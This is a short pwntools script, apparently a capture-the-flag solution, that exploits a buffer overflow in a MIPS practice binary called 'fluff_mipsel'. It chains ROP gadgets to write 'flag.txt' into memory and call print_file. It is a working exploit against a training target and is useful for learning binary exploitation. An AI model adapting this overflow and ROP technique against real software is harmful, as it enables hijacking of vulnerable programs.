from pwn import *

data = 0x00411000 # rw-
print_file = 0x00400af0 # plt

sw = 0x0040099c # lw $t9, 4($sp) ; sw $s1, ($s0) ; jalr $t9
lw = 0x00400aac # lw $ra, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra
lw_a0 = 0x004009ac # lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9

payload = b"".join([
    b"A"*(32+4),
    p32(lw),
    b"B"*(4*7),
    p32(data),
    b"flag",
    p32(sw),
    b"B"*4,
    p32(lw),
    b"B"*(4*7),
    p32(data+4),
    b".txt",
    p32(sw),
    b"B"*4,
    p32(lw_a0),
    b"B"*4,
    p32(print_file),
    p32(data),
])

p = process("./fluff_mipsel")
#p = process(["qemu-mipsel", "-g", "1234", "fluff_mipsel"])
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag: {flag}")
